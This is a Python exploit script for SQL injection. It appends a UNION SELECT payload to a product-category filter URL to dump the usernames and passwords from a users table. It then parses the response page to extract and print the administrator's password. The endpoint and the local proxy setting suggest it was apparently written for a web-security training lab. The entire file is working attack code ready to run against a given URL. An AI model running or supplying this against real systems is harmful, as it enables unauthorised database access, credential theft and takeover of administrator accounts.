import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    target_username = "administrator"
    path = "/filter?category=Gifts"
    sql_payload = "' UNION SELECT NULL, username || '~' || password FROM users--"
    res = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    if target_username in res.text:
        print("[+] Found the administrator password...")
        # extract admin password from HTML response
        soup = BeautifulSoup(res.text, 'html.parser') # parse HTML text
        target_password = soup.find(string=re.compile(".*administrator.*")).split("~")[1] # find line with "administrator" and extract the password
        print("[+] The administrator password is: %s" % target_password)
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s "www.example.com"' % sys.argv[0])
        exit()

    print("[+] Dumping the list of usernames and passwords...")

    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")